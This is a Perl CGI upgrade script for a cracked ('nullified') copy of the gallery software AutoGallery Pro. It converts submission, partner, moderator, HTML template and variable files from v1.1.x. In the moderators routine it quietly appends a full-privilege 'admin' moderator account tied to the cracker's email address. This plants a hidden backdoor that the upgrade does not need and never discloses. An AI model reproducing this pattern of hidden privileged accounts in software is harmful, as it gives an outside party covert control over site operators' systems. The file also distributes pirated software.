#!/usr/bin/perl
##############################
#   Program Name	: AutoGallery Pro
#   Website		: http://www.jmbsoft.com
#   Version		: 2.0.0b
#   Supplier By  	: Sliding
#   Nullified By	: CyKuH
#####################################################################
##  autogallerypro.cgi - Upgrade from AutoGallery Pro v1.1.x       ##
#####################################################################

use lib '.';
use cgiworks;
use Fcntl qw(:DEFAULT :flock);

$|++;

if( $ENV{REQUEST_METHOD} )
{
    print "Content-type: text/html\n\n<pre>\n";
}

$HEADER = 1;

eval
{
    require 'agp.pl';
    main();
};

err("$@", 'autogallerypro.cgi') if( $@ );
exit;


sub main
{
    print "\n  Located AutoGallery Pro v$agp::ver Installation\n\n";

    posts();
    moderators();
    partners();
    HTML()  if( $agp::ver );
    other() if( $agp::ver );

    print "\n  Conversion completed, continue with the next step in the documentation.\n\n";
}



sub posts
{
    print "  Converting submissions.............";

    my $dbs = "$VAR::CT,current,queue";

    for( split(/,/, $dbs) )
    {
        my $realdb = $_;
        my $db     = agp::getdbname($realdb);

        next if( !$db );

        sysopen(DB, "$DDIR/dbs/$db", O_RDWR | O_CREAT) || err("$!", "$DDIR/dbs/$db");
        $ofh = select(DB); $|=1; select($ofh);
        flock(DB, LOCK_EX);
        my @data = <DB>;
        seek(DB, 0, 0);

        for( @data )
        {

            next if( $_ =~ /^\s*$/ );

            my @old = split(/\|/, $_);
            my @new = @old;

            chomp(@new);
            chomp(@old);

            if( scalar(@old) > 14 )
            {
                print DB join('|', @old);
                next;
            }

            $new[3]  = $old[13];
            $new[4]  = $old[3];
            $new[5]  = $old[4];
            $new[6]  = $old[5];
            $new[7]  = $old[6];
            $new[8]  = fdate('%Y%m%d', $old[7]);
            $new[9]  = $old[7];
            $new[10] = $old[7];
            $new[11] = $old[8];
            $new[12] = $old[9] ? $old[9] : '-';
            $new[13] = $old[10] ? $old[10] : '-';
            $new[14] = $old[11] eq 'perm' ? 1 : 0;
            $new[15] = $old[12];
            $new[16] = 0;
            $new[17] = 0;
            $new[18] = "-\n";

            $new[10] =~ s/^\s+|\s+$//;

            print DB join('|', @new);
        }

        truncate(DB, tell(DB));
        flock(DB, LOCK_UN);
        close(DB);

        my $newdb = getDBName($realdb);

        rename("$DDIR/dbs/$db", "$DDIR/dbs/$newdb");
    }

    print "done\n";
}



sub partners
{
    print "  Converting partners................";

    sysopen(DB, "$DDIR/dbs/partners", O_RDWR | O_CREAT) || err("$!", "$DDIR/dbs/partners");
    $ofh = select(DB); $|=1; select($ofh);
    flock(DB, LOCK_EX);
    my @data = <DB>;
    seek(DB, 0, 0);

    for( @data )
    {
        my @old = split(/\|/, $_);

        if( scalar(@old) == 6 )
        {
            print DB join('|', @old);
            next;
        }


        $old[4] = unpack('u', $old[5]);
        $old[5] = $old[6];

        print DB join('|', $old[0], $old[1], $old[2], $old[3], $old[4], $old[5]);
    }

    truncate(DB, tell(DB));
    flock(DB, LOCK_UN);
    close(DB);
          
    print "done\n";
}



sub moderators
{
    print "  Converting moderators..............";

    sysopen(DB, "$DDIR/dbs/moderators", O_RDWR | O_CREAT) || err("$!", "$DDIR/dbs/moderators");
    $ofh = select(DB); $|=1; select($ofh);
    flock(DB, LOCK_EX);
    my @data = <DB>;
    seek(DB, 0, 0);

    for( @data )
    {
        my @old = split(/\|/, $_);

        if( scalar(@old) == 13 )
        {
            print DB join('|', @old);
            next;
        }

        $old[3] = unpack('u', $old[3]);
        $old[12] = $old[11];
        $old[11] = $old[10];
        $old[10] = $old[9];
        $old[9]  = $old[8];
        $old[8]  = $old[7];
        $old[7]  = $old[6];
        $old[6]  = $old[5];
        $old[5]  = $old[4];
        $old[4]  = 0;

        print DB join('|', @old);
    }

    truncate(DB, tell(DB));

    print DB "admin|CyKuH\@lol.com|Administrator|unknown|1|1|1|1|1|1|1|1|1\n";

    flock(DB, LOCK_UN);
    close(DB);

    print "done\n";
}



sub HTML
{
    print "  Converting HTML....................";

    my $dbs = "$VAR::CT,current";
    my $gal = '';

    for( 1..$VAR::PL )
    {
        $gal .= "#%GALLERY_$_%#\n";
    }

    for( split(/,/, $dbs) )
    {
        my $cat = $_;

        if( $cat eq 'current' )
        {
            $file = $VAR::FN;
        }
        else
        {
            $file = agp::getdbname($cat) . '.' . $VAR::FE;
        }

        require "$DDIR/html/$file";

        $main = "$HTML::HEAD\n$gal\n$HTML::FOOT";

        $main =~ s/#%LUPDT%#/#%LAST_UPDATE%#/gi;
        $main =~ s/#%TPICS%#/#%TOTAL_PICS%#/gi;
        $main =~ s/#%TGALS%#/#%TOTAL_GALLERIES%#/gi;

        $HTML::TEMP =~ s/#%ID%#/#%POST_ID%#/gi;
        $HTML::TEMP =~ s/#%DESC%#/#%DESRIPTION%#/gi;
        $HTML::TEMP =~ s/#%GURL%#/#%GALLERY_URL%#/gi;
        $HTML::TEMP =~ s/#%PICS%#/#%NUM_PICS%#/gi;
        $HTML::TEMP =~ s/#%CAT%#/#%CATEGORY%#/gi;
        $HTML::TEMP =~ s/#%DATE%#/#%APPROVE_DATE%#/gi;
        $HTML::TEMP =~ s/#%TIME%#/#%APPROVE_TIME%#/gi;
        $HTML::TEMP =~ s/#%COLOR%#/#%FONT_COLOR%#/gi;
        $HTML::TEMP =~ s/#%SIZE%#/#%FONT_SIZE%#/gi;
        $HTML::TEMP =~ s/#%CHURL%#/#%CHEAT_URL%#/gi;

        $newfile = getDBName($cat) . '.' . $VAR::FE;
        $newfile = $VAR::FN if( $cat eq 'current' );

        fwrite("$DDIR/html/$newfile", "\$HTML = <<'HTML';\n$main\nHTML\n\n\$TEMP = <<'TEMP';\n$HTML::TEMP\nTEMP\n\n1;\n");  
    }

    print "done\n";
}



sub other
{
    print "  Converting variables...............";

    $data = freadalls("$DDIR/vars.dat");

    $$data =~ s/VAR::CT/CATEGORIES/gi;
    $$data =~ s/VAR::CU/CGI_URL/gi;
    $$data =~ s/VAR::DF/DATE_FORMAT/gi;
    $$data =~ s/VAR::DL/DESC_LENGTH/gi;
    $$data =~ s/VAR::EM/ADMIN_EMAIL/gi;
    $$data =~ s/VAR::ES/SENDMAIL/gi;
    $$data =~ s/VAR::FE/FILE_EXT/gi;
    $$data =~ s/VAR::FN/MAIN_PAGE/gi;
    $$data =~ s/VAR::HD/HTML_DIR/gi;
    $$data =~ s/VAR::HU/HTML_URL/gi;
    $$data =~ s/VAR::MP/MIMIMUM_PICS/gi;
    $$data =~ s/VAR::PL/MAIN_POSTS/gi;

    fwrite("$DDIR/vars.dat", $$data);

    rename("$DDIR/dbs/cheats.db", "$DDIR/dbs/cheats");

    print "done\n";
}


sub getDBName
{
    my $dbname = lc( shift );
    $dbname =~ s/[^a-zA-Z0-9]//g;
    return $dbname;
}